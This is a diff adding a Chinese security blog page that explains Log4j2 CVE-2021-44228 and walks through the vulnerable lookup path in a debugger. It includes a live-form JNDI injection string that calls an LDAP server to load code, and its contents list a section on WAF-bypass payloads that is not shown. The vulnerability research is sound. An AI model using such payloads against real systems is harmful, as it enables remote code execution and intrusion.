@@ -1,0 +1,627 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+    <meta charset="utf-8">
+
+    
+
+    <!-- 渲染优化 -->
+    <meta name="renderer" content="webkit">
+    <meta name="force-rendering" content="webkit">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta name="HandheldFriendly" content="True" >
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+    <!--icon-->
+
+    
+    
+    
+    
+    
+
+
+    <!-- meta -->
+
+
+<title>Log4j2反序列化利用与分析 | Wileysec&#39;s Blog</title>
+
+
+    <meta name="keywords" content="Java安全, Log4j2">
+
+
+
+
+    <!-- OpenGraph -->
+ 
+    <meta name="description" content="基本概述Apache Log4j是一个流行的Java日志框架，用于将应用程序的日志输出到不同的目标，如文件、控制台或远程服务器。 2021年被爆存在远程代码执行漏洞，CVE漏洞编号为CVE-2021-44228，该漏洞可能导致远程代码执行，该漏洞的根本原因在于Log4j2中的一个特性，它允许开发人员通过特殊的日志消息来触发远程代码执行。具体来说，当Log4j2解析包含特定的JNDI（Java命名和">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Log4j2反序列化利用与分析">
+<meta property="og:url" content="https://wileysec.github.io/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/91ba9d0d39fd.html">
+<meta property="og:site_name" content="Wileysec&#39;s Blog">
+<meta property="og:description" content="基本概述Apache Log4j是一个流行的Java日志框架，用于将应用程序的日志输出到不同的目标，如文件、控制台或远程服务器。 2021年被爆存在远程代码执行漏洞，CVE漏洞编号为CVE-2021-44228，该漏洞可能导致远程代码执行，该漏洞的根本原因在于Log4j2中的一个特性，它允许开发人员通过特殊的日志消息来触发远程代码执行。具体来说，当Log4j2解析包含特定的JNDI（Java命名和">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230809172622090.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230809173355020.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230809174149191.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230809174450035.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810105409907.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810105723074.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810105954750.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810111332129.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810111610244.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810112142198.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810112549822.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810121902360.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810122009989.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810122851390.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810123341471.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810123525884.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810123803254.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810124036153.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810124523804.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810124950786.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810125820549.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810141555878.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810144100615.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810144359151.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810144533323.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810144916100.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810145827565.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810150322350.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810151005978.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810151053947.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810151212154.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810151343284.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810153616999.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810154036596.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810154238543.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810154845217.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810155214967.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810155426911.png">
+<meta property="og:image" content="https://wileysec.github.io/images/image-20230810155634899.png">
+<meta property="article:published_time" content="2023-08-09T04:30:08.081Z">
+<meta property="article:modified_time" content="2023-08-25T18:03:13.985Z">
+<meta property="article:author" content="wileysec">
+<meta property="article:tag" content="Java安全">
+<meta property="article:tag" content="Log4j2">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wileysec.github.io/images/image-20230809172622090.png">
+
+
+    
+<link rel="stylesheet" href="/css/style/main.css">
+ 
+
+    
+    
+    
+    
+        <link rel="stylesheet" id="hl-default-theme" href="https://cdn.jsdelivr.net/npm/prismjs@1.21.0/themes/prism-tomorrow.min.css" media="none" >
+        
+    
+    
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@1.21.0/plugins/line-numbers/prism-line-numbers.min.css" media="none" onload="this.media='all'">
+    
+
+
+    
+    
+<link rel="stylesheet" href="/css/style/dark.css">
+
+    
+<script src="/js/darkmode.js"></script>
+
+
+
+     
+
+    <!-- custom head -->
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+    <body>
+        <div id="app" tabindex="-1">
+            <header class="header">
+    <div class="header__left">
+        <a href="/" class="button">
+            <span class="logo__text">Wiley&#39;s Blog</span>
+        </a>
+    </div>
+    <div class="header__right">
+        
+            <div class="navbar__menus">
+                
+                    <a href="/" class="navbar-menu button">首页</a>
+                
+                    <a href="/tags/" class="navbar-menu button">标签</a>
+                
+                    <a href="/archives/" class="navbar-menu button">归档</a>
+                
+                    <a href="/links/" class="navbar-menu button">链接</a>
+                
+                    <a href="/about/" class="navbar-menu button">关于我</a>
+                
+            </div>
+        
+        
+        
+    <a href="/search/" id="btn-search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" width="24" height="24" fill="currentColor" stroke="currentColor" stroke-width="32"><path d="M192 448c0-141.152 114.848-256 256-256s256 114.848 256 256-114.848 256-256 256-256-114.848-256-256z m710.624 409.376l-206.88-206.88A318.784 318.784 0 0 0 768 448c0-176.736-143.264-320-320-320S128 271.264 128 448s143.264 320 320 320a318.784 318.784 0 0 0 202.496-72.256l206.88 206.88 45.248-45.248z"></path></svg>
+    </a>
+
+
+        
+        
+    <a href="javaScript:void(0);" id="btn-toggle-dark">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path></svg>
+    </a>
+
+
+        
+            <a class="dropdown-icon button" id="btn-dropdown" tabindex="0"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" width='24' height='24' fill="none" stroke="currentColor" stroke-width="0.7" stroke-linecap="round" stroke-linejoin="round"><path fill="currentColor" d="M3.314,4.8h13.372c0.41,0,0.743-0.333,0.743-0.743c0-0.41-0.333-0.743-0.743-0.743H3.314c-0.41,0-0.743,0.333-0.743,0.743C2.571,4.467,2.904,4.8,3.314,4.8z M16.686,15.2H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,15.2,16.686,15.2z M16.686,9.257H3.314c-0.41,0-0.743,0.333-0.743,0.743s0.333,0.743,0.743,0.743h13.372c0.41,0,0.743-0.333,0.743-0.743S17.096,9.257,16.686,9.257z"></path></svg></a>
+            <div class="dropdown-menus" id="dropdown-menus">
+                
+                    <a href="/" class="dropdown-menu button">首页</a>
+                
+                    <a href="/tags/" class="dropdown-menu button">标签</a>
+                
+                    <a href="/archives/" class="dropdown-menu button">归档</a>
+                
+                    <a href="/links/" class="dropdown-menu button">链接</a>
+                
+                    <a href="/about/" class="dropdown-menu button">关于我</a>
+                
+            </div>
+        
+    </div>
+</header>
+
+
+            <main class="main">
+    
+
+<div class="post-title">
+    <h1 class="post-title__text">
+        Log4j2反序列化利用与分析
+    </h1>
+    <div class="post-title__meta">
+        <a href="/archives/2023/08/" class="post-meta__date button">文章创建于 2023-08-09</a>
+        
+    <span class="separate-dot"></span><a href="/categories/Java%E5%AE%89%E5%85%A8-%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB/" class="button">Java安全,技术分享</a>
+
+ 
+        
+    
+    
+
+
+ 
+
+ 
+    </div>
+</div>
+
+
+    <aside class="post-side">
+        <div class="post-side__toc">
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E8%BF%B0"><span class="toc-text">基本概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">影响版本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Log4j%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80"><span class="toc-text">Log4j使用基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-44228%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-text">CVE-2021-44228调试分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload%E5%8F%98%E5%BD%A2%E7%BB%95%E8%BF%87WAF"><span class="toc-text">Payload变形绕过WAF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol>
+        </div>
+    </aside>
+    <a class="btn-toc button" id="btn-toc" tabindex="0">
+        <svg viewBox="0 0 1024 1024" width="32" height="32" xmlns="http://www.w3.org/2000/svg">
+            <path d="M128 256h64V192H128zM320 256h576V192H320zM128 544h64v-64H128zM320 544h576v-64H320zM128 832h64v-64H128zM320 832h576v-64H320z" fill="currentColor"></path>
+        </svg>
+    </a>
+    <div class="toc-menus" id="toc-menus">
+        <div class="toc-title">Article Directory</div>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E8%BF%B0"><span class="toc-text">基本概述</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-text">影响版本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Log4j%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80"><span class="toc-text">Log4j使用基础</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2021-44228%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-text">CVE-2021-44228调试分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Payload%E5%8F%98%E5%BD%A2%E7%BB%95%E8%BF%87WAF"><span class="toc-text">Payload变形绕过WAF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text">参考链接</span></a></li></ol>
+    </div>
+
+
+<article class="post post__with-toc content-card">
+    <div class="post__header"></div>
+    <div class="post__content">
+        <h2 id="基本概述"><a href="#基本概述" class="headerlink" title="基本概述"></a>基本概述</h2><p>Apache Log4j是一个流行的Java日志框架，用于将应用程序的日志输出到不同的目标，如文件、控制台或远程服务器。</p>
+<p>2021年被爆存在远程代码执行漏洞，CVE漏洞编号为CVE-2021-44228，该漏洞可能导致远程代码执行，该漏洞的根本原因在于Log4j2中的一个特性，它允许开发人员通过特殊的日志消息来触发远程代码执行。具体来说，当Log4j2解析包含特定的JNDI（Java命名和目录接口）引用的日志消息时，它将尝试通过JNDI查找来获取对应资源的引用。攻击者可以构造一个恶意的JNDI引用，通过发送包含该引用的日志消息来触发远程代码执行。</p>
+<h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>2.0.0 &lt;&#x3D; Apache Log4j &lt;&#x3D; 2.14.0</p>
+<p>JDK影响版本是根据JDK本身版本有关，高版本也存在被绕过风险</p>
+<h2 id="Log4j使用基础"><a href="#Log4j使用基础" class="headerlink" title="Log4j使用基础"></a>Log4j使用基础</h2><p>使用Log4j先引入依赖</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.14.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j-api<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.14.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>在 <code>resources</code> 文件夹中新建 <code>log4j2.xml</code> 文件，用于配置log4j</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Configuration</span> <span class="token attr-name">status</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>INFO<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Appenders</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Console</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>SYSTEM_OUT<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PatternLayout</span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Console</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>File</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>File<span class="token punctuation">"</span></span> <span class="token attr-name">fileName</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>logs/application.log<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PatternLayout</span> <span class="token attr-name">pattern</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>File</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Appenders</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Loggers</span><span class="token punctuation">></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>Root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>info<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AppenderRef</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Console<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>AppenderRef</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>File<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
+        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Root</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Loggers</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>Configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">LogManager</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">Main</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"这是一条日志"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 这是一条日志</span>
+        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"$&#123;java:os&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Mac OS X 10.16 unknown, architecture: x86_64-64</span>
+        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"$&#123;upper:aaa&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// AAA</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><code>$&#123;&#125; </code> 在Log4j中被称为变量插值，它是一种特殊的语法，用于在日志消息中引用和替换变量的值，通过在 <code>$&#123;&#125;</code> 中指定变量名称，Log4j可以动态地将变量的值插入到日志消息中</p>
+<p>需要注意的是，在Log4j中使用变量插值时，变量的值可以从不同的来源获取，例如系统属性、环境变量、配置文件等。这使得Log4j可以根据不同的部署环境和配置文件进行灵活的日志定制</p>
+<h2 id="CVE-2021-44228调试分析"><a href="#CVE-2021-44228调试分析" class="headerlink" title="CVE-2021-44228调试分析"></a>CVE-2021-44228调试分析</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">LogManager</span></span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>logging<span class="token punctuation">.</span>log4j<span class="token punctuation">.</span></span><span class="token class-name">Logger</span></span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Main</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">Logger</span> logger <span class="token operator">=</span> <span class="token class-name">LogManager</span><span class="token punctuation">.</span><span class="token function">getLogger</span><span class="token punctuation">(</span><span class="token class-name">Main</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        logger<span class="token punctuation">.</span><span class="token function">info</span><span class="token punctuation">(</span><span class="token string">"$&#123;jndi:ldap://127.0.0.1:8085/kOXQHHlE&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/images/image-20230809172622090.png" alt="image-20230809172622090"></p>
+<p><img src="/images/image-20230809173355020.png" alt="image-20230809173355020"></p>
+<p><img src="/images/image-20230809174149191.png" alt="image-20230809174149191"></p>
+<p>在 <code>info</code> 方法中，判断了是否开启了日志记录</p>
+<p><img src="/images/image-20230809174450035.png" alt="image-20230809174450035"></p>
+<p>调用了 <code>logMessageSafely</code> 方法，用于将日志安全的记录到日志文件中，确保不会记录日志消息时发生任何异常和错误，继续往下走</p>
+<p><img src="/images/image-20230810105409907.png" alt="image-20230810105409907"></p>
+<p><code>logMessageTrackRecursion</code> 方法用于记录递归调用的日志信息，再继续往下走</p>
+<p><img src="/images/image-20230810105723074.png" alt="image-20230810105723074"></p>
+<p><code>tryLogMessage</code> 方法尝试记录日志消息，分析切入点正是这里</p>
+<p><img src="/images/image-20230810105954750.png" alt="image-20230810105954750"></p>
+<p>在这个方法里其实就是调用了 <code>log</code> 方法，如果出现异常，则抛出异常，跟进 <code>log</code> 方法看一下</p>
+<p><img src="/images/image-20230810111332129.png" alt="image-20230810111332129"></p>
+<p><img src="/images/image-20230810111610244.png" alt="image-20230810111610244"></p>
+<p>获取了 <code>Logger</code> 的日志记录器配置对象，再调用了 <code>log</code> 方法</p>
+<p><img src="/images/image-20230810112142198.png" alt="image-20230810112142198"></p>
+<p>在该方法中通过日志事件工厂对象 <code>logEventFactory</code> 创建了一个Log4j日志事件对象，并作为参数调用了 <code>log</code> 方法，继续往下走</p>
+<p><img src="/images/image-20230810112549822.png" alt="image-20230810112549822"></p>
+<p>这里调用 <code>processLogEvent</code> 方法处理日志事件</p>
+<p><img src="/images/image-20230810121902360.png" alt="image-20230810121902360"></p>
+<p><img src="/images/image-20230810122009989.png" alt="image-20230810122009989"></p>
+<p>这里就是对日志事件的输出目标附加器进行遍历，我们再来看下在 <code>callAppender</code> 方法中做了什么</p>
+<p><img src="/images/image-20230810122851390.png" alt="image-20230810122851390"></p>
+<p><code>shouldSkip</code> 方法用于控制和判断日志事件是否被过滤或是否存在递归调用，随后调用了 <code>callAppenderPreventRecursion</code> 预防递归调用附加器方法</p>
+<p><img src="/images/image-20230810123341471.png" alt="image-20230810123341471"></p>
+<p>到了这里尝试对Log4j日志事件对象调用附加器，继续跟进</p>
+<p><img src="/images/image-20230810123525884.png" alt="image-20230810123525884"></p>
+<p>这里将日志事件对象添加到 <code>ConsoleAppender</code> 附加器中</p>
+<p><img src="/images/image-20230810123803254.png" alt="image-20230810123803254"> </p>
+<p><code>append</code> 方法中调用了 <code>tryAppend</code> 方法，在该方法中判断了是否开启了直接编码器，默认是开启的，调用 <code>directEncodeEvent</code> 方法</p>
+<p><img src="/images/image-20230810124036153.png" alt="image-20230810124036153"></p>
+<p>在这里获取了日志事件布局，在日志事件布局中包含输出的格式、日期、日志级别、消息内容等信息，再调用了日志事件布局对象的 <code>encode</code> 方法</p>
+<p><img src="/images/image-20230810124523804.png" alt="image-20230810124523804"></p>
+<p>调用 <code>toText</code> 方法将日志事件序列化为字符串</p>
+<p><img src="/images/image-20230810124950786.png" alt="image-20230810124950786"></p>
+<p>在该方法中调用序列化器的 <code>toSerializable</code> 方法，<code>serializer</code> 其实就是模式序列化器，有如下的模式格式化器：</p>
+<pre class="line-numbers language-none"><code class="language-none">DatePatternConverter
+LiteralPatternConverter
+ThreadNamePatternConverter
+LiteralPatternConverter
+LevelPatternConverter
+LiteralPatternConverter
+LoggerPatternConverter
+LiteralPatternConverter
+MessagePatternConverter
+LineSeparatorPatternConverter
+ExtendedThrowablePatternConverter<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>我们需要关注是 <code>MessagePatternConverter</code> 消息格式转换器，因为只有这一格式转换器是我们可控的，也就是一开始传入的参数 <code>message</code>，我们跟进一下toSerializable方法</p>
+<p><img src="/images/image-20230810125820549.png" alt="image-20230810125820549"></p>
+<p>这里其实就是对模式序列化器进行遍历格式化调用 <code>format</code> 方法，我们的关注点是在 <code>MessagePatternConverter</code> 中，所以跳过无关紧要的格式转换器，直接到索引为8的 <code>PatternFormatter</code> 模式格式化器 <code>format</code> 方法中看做了什么</p>
+<p><img src="/images/image-20230810141555878.png" alt="image-20230810141555878"></p>
+<p>调用了转换器的 <code>format</code> 方法，目前的转换器是 <code>MessagePatternConverter</code> </p>
+<p><img src="/images/image-20230810144100615.png" alt="image-20230810144100615"></p>
+<p><img src="/images/image-20230810144359151.png" alt="image-20230810144359151"></p>
+<p><code>msg</code> 对象中的 <code>message</code> 就是我们一开始传入参数的日志消息，随后将 <code>msg</code> 对象强转成 <code>StringBuilderFormattable</code> 类型再调用了 <code>formatTo</code> 方法</p>
+<p><code>workingBuilder</code> 对象存放的就是日志输出的前缀信息</p>
+<p><img src="/images/image-20230810144533323.png" alt="image-20230810144533323"></p>
+<p>这里其实就是将 <code>message</code> 内容追加到 <code>workingBuilder</code> 中</p>
+<p><img src="/images/image-20230810144916100.png" alt="image-20230810144916100"></p>
+<p><code>noLookups</code> 默认为false，这里对 <code>workingBuilder</code> 内容进行遍历，判断第一个字符和第二个字符是否分别为 <code>$</code> 和 <code>&#123;</code> 符号，<code>value</code> 变量就是截取的字符串 <code>$&#123;jndi:ldap://127.0.0.1:8085/kOXQHHlE&#125;</code>，接着设置 <code>workingBuilder</code> 的长度为 <code>offset</code>，并追加内容为 <code>config.getStrSubstitutor().replace()</code> 方法的返回值</p>
+<p><img src="/images/image-20230810145827565.png" alt="image-20230810145827565"></p>
+<p><code>replace</code> 方法中调用了 <code>substitute</code> 方法</p>
+<p><img src="/images/image-20230810150322350.png" alt="image-20230810150322350"></p>
+<p><code>substitute</code> 方法的前面部分主要是获取了变量的前缀和后缀匹配器，前缀匹配器为 <code>$</code> 和 <code>&#123;</code>，后缀匹配器为 <code>&#125;</code>，再获取了转义特殊字符的转义字符也就是 <code>$</code> 和分隔符匹配器 <code>:</code> 和 <code>-</code>，接着就是把 <code>buf</code> 对象转换为字符数组，从0开始循环一直到这个字符串的长度38为止，然后依次循环匹配是否到前缀匹配器，前两个就匹配到了，返回值不是0所以走else语句</p>
+<p><img src="/images/image-20230810151005978.png" alt="image-20230810151005978"></p>
+<p><img src="/images/image-20230810151053947.png" alt="image-20230810151053947"></p>
